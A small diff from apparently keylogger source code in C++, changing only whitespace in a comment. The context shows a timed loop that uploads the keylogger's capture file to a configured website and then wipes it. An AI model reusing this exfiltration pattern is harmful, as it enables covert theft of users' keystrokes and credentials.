@@ -33,7 +33,7 @@ int main()
                 //cout << "choice file: "+choice.getFile()+"\r\n";
                 //cout << "keylogger file: " + key.getFile() + "\r\n";
                 //cout << "website: " + choice.getSite() + "\r\n";
-                //cout << "60 seconds elapsed" << endl;
+                //cout << "60 seconds elapsed" << endl; 
                 r.request(choice.getSite(), choice.getFile());
                 key.clearFile();
                 t.restart();
